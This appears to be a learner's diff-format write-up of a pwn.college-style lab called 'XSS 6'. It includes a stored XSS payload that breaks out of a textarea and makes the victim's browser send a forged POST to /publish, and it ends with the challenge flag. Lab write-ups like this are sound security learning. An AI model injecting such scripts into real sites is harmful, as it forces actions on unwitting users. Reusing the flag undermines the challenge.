@@ -1,0 +1,28 @@
+# challenge: XSS 6
+
+📅 2026-02-28
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+the challenge works the same as previous one but /publish endpoint is POST method
+-ran: '/challenge/server'
+-opened the browser
+-url: http://challenge.localhost:80/
+-logged in as hacker-1337
+-typed in post field thicking publish and saved it: </textarea><script> fetch('/publish', {method: 'POST'})</script>
+-opened a new terminal
+-ran: '/challenge/victim http://challenge.localhost:80/'
+-went back to firefox and reloaded the page
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+how to use fetch function when the endpoint's method is POST
+u have to specify: method: '', headers: '', body: '' -> in this case its POST method but with no body so {method: 'POST'} is enough
+
+## 🏁 Flag  
+pwn.college{wTCAGr1cnxEPTRvQaej1kw0BW5q.QXwgTN2wCO4IDOxEzW}
